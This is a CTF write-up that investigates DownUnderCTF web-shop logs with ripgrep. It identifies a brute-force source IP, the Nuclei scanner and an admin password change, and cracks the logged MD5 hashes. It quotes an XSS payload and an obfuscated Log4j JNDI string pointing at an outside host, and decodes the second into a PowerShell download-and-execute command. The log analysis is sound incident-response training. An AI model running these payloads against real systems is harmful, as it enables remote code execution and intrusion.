## knock knock knock

> What's the contact email for the ISP of the attacker's IP? Flag format: Email address, case insensitive

```
rg '/login' -B3| rg orig
DownUnderShop.JSON-    "origin": "58.164.62.91",
DownUnderShop.JSON-    "origin": "58.164.62.91",
DownUnderShop.JSON-    "origin": "58.164.62.91",
DownUnderShop.JSON-    "origin": "58.164.62.91",
DownUnderShop.JSON-    "origin": "58.164.62.91",
DownUnderShop.JSON-    "origin": "58.164.62.91",
DownUnderShop.JSON-    "origin": "58.164.62.91",
DownUnderShop.JSON-    "origin": "58.164.62.91",
DownUnderShop.JSON-    "origin": "58.164.62.91",
DownUnderShop.JSON-    "origin": "58.164.62.91",

```

looks like bruteforce to me

```
{
  "ip": "58.164.62.91",
  "hostname": "cpe-58-164-62-91.nb14.nsw.asp.telstra.net",
  "city": "The Rock",
  "region": "New South Wales",
  "country": "AU",
  "loc": "-35.2730,147.1138",
  "org": "AS1221 Telstra Corporation Ltd",
  "postal": "2655",
  "timezone": "Australia/Sydney",
  "readme": "https://ipinfo.io/missingauth"
```

whois:
remarks:        abuse@telstra.net was validated on 2022-06-16

## Logging for what?

```
We implemented a basic IPS to help protect our site from new attacks.

Somehow, a newer more sophisticated version of a regularly observed attack was successfully executed against the website.

What is the name of the script that was run?

Flag format: Name of the script that was run, case sensitive.
```

get rare urls:

```
rg url *JSON| sort |uniq -c| sort -n

```

suss url:

```
"shop.downunderctf.com/plugin/build-metrics/getBuildStats?label=%22%3E%3Csvg%2Fonload%3Dalert(1337)%3E&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search"
```

```
%22%3E%3Csvg%2Fonload%3Dalert(1337)%3E&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search

decoded

"><svg/onload=alert(1337)>&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json={"label":+"Search+Results",+"range":+"2",+"rangeUnits":+"Weeks",+"jobFilteringType":+"ALL",+"jobNameRegex":+"",+"jobFilter":+"",+"nodeFilteringType":+"ALL",+"nodeNameRegex":+"",+"nodeFilter":+"",+"launcherFilteringType":+"ALL",+"launcherNameRegex":+"",+"launcherFilter":+"",+"causeFilteringType":+"ALL",+"causeNameRegex":+"",+"causeFilter":+"",+"Jenkins-Crumb":+"4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96"}&Submit=Search


```

looking thru user agents:

looks like log4j to me

```
rg agent
2680:    "useragent": "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://41.108.181.141:5552/Basic/Command/Base64/cG93ZXJzaGVsbC5leGUgLWV4ZWMgYnlwYXNzIC1DICJJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vZG93bnVuZGVyY3RmLmNvbS9wVENOcDVwNkxQMGQ3cUE3N3l2YjRTSGY0MCcpOyI=}",
```

```
echo cG93ZXJzaGVsbC5leGUgLWV4ZWMgYnlwYXNzIC1DICJJRVggKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vZG93bnVuZGVyY3RmLmNvbS9wVENOcDVwNkxQMGQ3cUE3N3l2YjRTSGY0MCcpOyI=|base64 -d
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://downunderctf.com/pTCNp5p6LP0d7qA77yvb4SHf40');
```

flag is pTCNp5p6LP0d7qA77yvb4SHf40

## Im just looking

```
We've seen some vulnerability scanning activity against us!

What was the name of the tool used?

Flag format: Name of the tool used, case insensitive
```

looking thru user agents don't review much, but looking thru URLs show nuclei somewhere

```
rg nucl
1475:    "url": "shop.downunderctf.com/wp-content/uploads/simple-file-list/nuclei.php",
1511:    "url": "shop.downunderctf.com/nuclei.txt",
1547:    "url": "shop.downunderctf.com/include/nuclei.txt",
```

## Oi! Get out of there! 

```
Someone was able to successfully break into the admin account!

Do you know what the old password was?

Flag format: The password, case insensitive
```

web mail logs show sth like this:

```
    "_time": "2021-01-01T09:26:52.000+0000",
    "sender": "noreply@shop.downunderctf.com",
    "recipient": "admin@shop.downunderctf.com",
    "direction": "Outgoing",
    "outcome": "Unknown",
    "subject": "Your shop.downunderctf.com Password Has Been Changed",
    "attachments": "null",
    "logSource": "Webmail"
} {
```

some login urls has weird ref parameters:

```sh
rg url *JSON|rg login| rg ref
    "url": "shop.downunderctf.com/login?ref=YjUwNmZiMGNhYmI2MGU5ZjExMzJkYWE3MmRmNGQ1Njc6NmQ3YzViM2U3OTZkODMzYjNmZGQ0MGY0Y2U1N2ZhY2Q%3D",
    "url": "shop.downunderctf.com/login?ref=MmFjOWNiN2RjMDJiM2MwMDgzZWI3MDg5OGU1NDliNjM6NmQ3YzViM2U3OTZkODMzYjNmZGQ0MGY0Y2U1N2ZhY2Q%3D",
    "url": "shop.downunderctf.com/login?ref=M2RjOTE5ZGUxODZkMWE4ZWU2MmZmZjkyZDgwODM5Zjc6NmQ3YzViM2U3OTZkODMzYjNmZGQ0MGY0Y2U1N2ZhY2Q%3D",
    "url": "shop.downunderctf.com/login?ref=N2E1ODFhYzRkOGNiM2JmYzU5NmZjZTlhZmIxMTVmZDI6NmQ3YzViM2U3OTZkODMzYjNmZGQ0MGY0Y2U1N2ZhY2Q%3D",

```

extracting the end bit and decoding it (%3D is '=') in base64:

```
for i in $(rg url *JSON|rg login| rg ref|cut -d '=' -f 2| sed 's/%3D/=\n/'|cut -d '"' -f 1); do echo $i|base64 -d ;echo; done
b506fb0cabb60e9f1132daa72df4d567:6d7c5b3e796d833b3fdd40f4ce57facd
2ac9cb7dc02b3c0083eb70898e549b63:6d7c5b3e796d833b3fdd40f4ce57facd
3dc919de186d1a8ee62fff92d80839f7:6d7c5b3e796d833b3fdd40f4ce57facd
7a581ac4d8cb3bfc596fce9afb115fd2:6d7c5b3e796d833b3fdd40f4ce57facd
```

```

Hash	Type	Result
6d7c5b3e796d833b3fdd40f4ce57facd	md5	haxxor1
b506fb0cabb60e9f1132daa72df4d567	md5	crackstation
2ac9cb7dc02b3c0083eb70898e549b63	md5	Password1
3dc919de186d1a8ee62fff92d80839f7	Unknown	Not found.
7a581ac4d8cb3bfc596fce9afb115fd2	md5	downunder2
```

none of these are correct

time of password change:

```
rg -C5 'admin@' *JSON
1007-    "url": "shop.downunderctf.com/product?id=3",
1008-    "logSource": "Http:Web"
1009-} {
1010-    "_time": "2021-01-01T09:26:52.000+0000",
1011-    "sender": "noreply@shop.downunderctf.com",
1012:    "recipient": "admin@shop.downunderctf.com",
1013-    "direction": "Outgoing",
1014-    "outcome": "Unknown",
1015-    "subject": "Your shop.downunderctf.com Password Has Been Changed",
1016-    "attachments": "null",
1017-    "logSource": "Webmail"
--
2132-    "url": "shop.downunderctf.com/browse",
2133-    "logSource": "Http:Web"
2134-} {
2135-    "_time": "2021-01-01T09:26:52.000+0000",
2136-    "sender": "noreply@shop.downunderctf.com",
2137:    "recipient": "admin@shop.downunderctf.com",
2138-    "direction": "Incoming",
2139-    "outcome": "Delivered",
2140-    "subject": "Your shop.downunderctf.com Password Has Been Changed",
2141-    "attachments": "null",
2142-    "logSource": "Webmail"

```

so the event mustve occurred sometime around then.

```
rg -B4 -i changepas| rg _time
DownUnderShop.JSON-    "_time": "2021-01-01T09:15:48.000+0000",
DownUnderShop.JSON-    "_time": "2021-01-01T09:15:50.000+0000",
DownUnderShop.JSON-    "_time": "2021-01-01T09:18:11.000+0000",
DownUnderShop.JSON-    "_time": "2021-01-01T09:18:12.000+0000",
DownUnderShop.JSON-    "_time": "2021-01-01T09:26:51.000+0000",  <-- this one?
DownUnderShop.JSON-    "_time": "2021-01-01T09:26:52.000+0000",  <-- this one? exact time
DownUnderShop.JSON-    "_time": "2021-01-01T09:40:41.000+0000",
DownUnderShop.JSON-    "_time": "2021-01-01T09:40:43.000+0000",

```



### attachments

```
683:    "attachments": "Downunderctf-FaxReport.docm",
692:    "attachments": "Downunderctf-FaxReport.docm",
701:    "attachments": "attachment.png",

```

```
676-} {
677-    "_time": "2021-01-01T09:02:10.000+0000",
678-    "sender": "faxinfo@web.de",
679-    "recipient": "support@shop.downunderctf.com",
680-    "direction": "Incoming",
681-    "outcome": "Block-Spam",
682-    "subject": "Important Tax Fax Details",
683:    "attachments": "Downunderctf-FaxReport.docm",
684-    "logSource": "Webmail"
685-} {

```

^^ this one went to spam.. suss?


```
695-    "_time": "2021-01-01T09:08:39.000+0000",
696-    "sender": "bob123@gmail.com",
697-    "recipient": "support@shop.downunderctf.com",
698-    "direction": "Incoming",
699-    "outcome": "Delivered",
700-    "subject": "OrderID - #16042",
701:    "attachments": "attachment.png",
702-    "logSource": "Webmail"
703-} {

```

## looking at changed passwords again

this is the one that wasn't cracked by crackstation:

```
956-    "_time": "2021-01-01T09:26:52.000+0000",
957-    "origin": "58.164.62.91",
958-    "site": "shop.downunderctf.com",
959-    "method": "GET",
960-    "referer": "shop.downunderctf.com/changepassword",
961-    "useragent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.36 Safari/537.36",
962:    "url": "shop.downunderctf.com/login?ref=M2RjOTE5ZGUxODZkMWE4ZWU2MmZmZjkyZDgwODM5Zjc6NmQ3YzViM2U3OTZkODMzYjNmZGQ0MGY0Y2U1N2ZhY2Q%3D",

```

3dc919de186d1a8ee62fff92d80839f7:6d7c5b3e796d833b3fdd40f4ce57facd

around 09:26 which is right after the admin got the password reset email (09:26:52.000+0000)

hash cracked/found:
https://hashes.com/en/decrypt/hash

3dc919de186d1a8ee62fff92d80839f7:ozzieozzieozzie

